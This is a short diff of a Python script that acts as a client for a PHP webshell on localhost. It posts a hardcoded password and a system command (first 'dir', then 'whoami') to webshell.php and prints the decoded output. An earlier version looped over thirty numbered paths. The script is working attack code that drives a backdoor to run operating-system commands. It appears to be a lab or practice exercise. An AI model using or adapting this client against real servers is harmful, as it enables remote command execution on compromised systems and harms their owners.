@@ -1,8 +1,8 @@
 #-*-coding:utf-8-*-
 import requests
-payload = {'passwd':'i4mhmh!','a':'system(dir);'}
-for i in range(0,30):
-    u = 'http://localhost/'+str(i)+'/webshell.php'  
-    r = requests.post(url=u,data=payload)
-    print(r.text)
-'''尚未解决乱码问题'''
+payload = {'passwd':'i4mhmh!','a':'system(whoami);'}
+u = 'http://localhost/webshell.php'  
+r = requests.post(url=u,data=payload)
+html=r.text.encode('latin1').decode('gbk')
+print(html)
+'''成功解决乱码问题'''
